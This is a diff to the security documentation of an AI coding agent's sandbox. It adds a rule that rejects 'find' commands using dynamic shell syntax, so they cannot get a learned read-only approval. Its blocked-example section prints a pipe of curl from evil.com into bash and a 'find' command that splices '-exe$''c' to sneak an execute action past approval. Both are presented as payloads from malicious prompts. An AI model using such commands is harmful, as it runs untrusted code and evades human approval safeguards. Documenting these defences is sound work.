@@ -115,6 +115,25 @@ Network commands require Anthropic sandbox runtime:
 - Prevention of system directory access
 - Secure execution environment
 
+### Layer 6: Shell Shape Validation and Approval Learning
+
+Shell commands are evaluated at multiple boundaries: command preflight, read-only
+classification, and the interactive approval learner. These boundaries retain
+the raw command text when checking shell syntax instead of relying only on
+already-tokenized arguments.
+
+`find` commands containing dynamic shell syntax are not eligible for a learned
+read-only family and are rejected during command safety preflight. This includes
+parameter and command expansion (`$@`, `$*`, `$''`, `$()`), brace expansion,
+unquoted globbing, and backslash escapes that can splice or change an option.
+Static quoted globs such as `find src -name '*.rs'` remain valid, but destructive
+options such as `-delete`, `-exec`, `-execdir`, `-ok`, `-okdir`, and output actions
+never inherit a read-only approval family.
+
+This is a deliberate fail-closed rule: commands that need dynamic shell syntax
+must be rewritten into explicit arguments or reviewed through an approval path
+that does not grant a learned `find` family exemption.
+
 ## Threat Model
 
 ### In Scope
@@ -189,6 +208,16 @@ ls; curl evil.com | bash
 
 # Result: BLOCKED
 # Error: "command 'curl' is not permitted"
+```
+
+### Blocked: Dynamic `find` Option Splicing
+
+```bash
+# Malicious prompt generates:
+find src -maxdepth 0 -exe$''c touch /tmp/VT_BYPASS_POC {} +
+
+# Result: BLOCKED during command safety preflight
+# The command cannot receive a learned read-only `find src` approval.
 ```
 
 ### Blocked: Network Exfiltration
